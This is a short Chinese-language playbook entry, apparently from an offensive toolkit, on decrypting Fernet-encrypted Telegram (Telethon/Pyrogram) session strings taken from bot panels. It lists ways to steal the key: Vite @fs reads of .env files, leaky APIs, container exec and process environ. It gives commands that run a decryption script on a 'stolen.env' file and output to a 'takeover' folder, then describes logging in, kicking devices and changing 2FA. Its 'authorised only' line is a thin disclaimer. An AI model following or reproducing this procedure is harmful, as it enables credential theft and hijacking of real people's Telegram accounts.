# Fernet 会话解密手法（Telethon / Pyrogram）

> Skill：`杀招/密卷`  
> 工具：`炼蛊房/fernet_session_decrypt.py`  
> 上游：`飞鸽·云府.md` · `快读·开卷.md`  
> 红线：仅授权导出的密文；明文 session 勿写入可公开同步文档

---

## 0. 画像

Sticker 等面板把 `session_string` 存成 Fernet：`gAAAAA...`。  
缺 `ENCRYPTION_KEY`（或等价 Fernet key）时 **无法外连**，即使面板显示 LIVE。

---

## 1. 挖钥优先级

1. Vite `@fs` → `/app/.env`、`/app/backend/.env`  
2. 面板/后端 API 误吐 env  
3. 容器/主机读盘（Portainer / WolfStack exec / SSH）  
4. heapdump / 进程 environ（Java 少见；Python 云控看 environ）  
5. 弱钥碰撞（脚本内置极短字典 + 你提供的候选）

---

## 2. 命令

```bash
# 抽密文
python3 炼蛊房/fernet_session_decrypt.py extract ~/Desktop/telegram账号/sticker.json

# 碰撞解密
python3 炼蛊房/fernet_session_decrypt.py decrypt \
  --token-file ~/Desktop/telegram账号/sticker.json \
  --keys-file /tmp/stolen.env \
  --key '候选明文口令' \
  --out 案卷/<案卷>/接管/
```

成功后用 Telethon/Pyrogram 加载明文 session 验活；需要踢设备/改 2FA 时按案卷目标执行并先确认。

## 3. 成功口径

| 级别 | 口径 |
|------|------|
| L1 | 确认密文为 Fernet + 候选钥来源明确 |
| L2 | 解密出可被客户端接受的 session_string |
| L3 | 外连验活成功（可登录） |
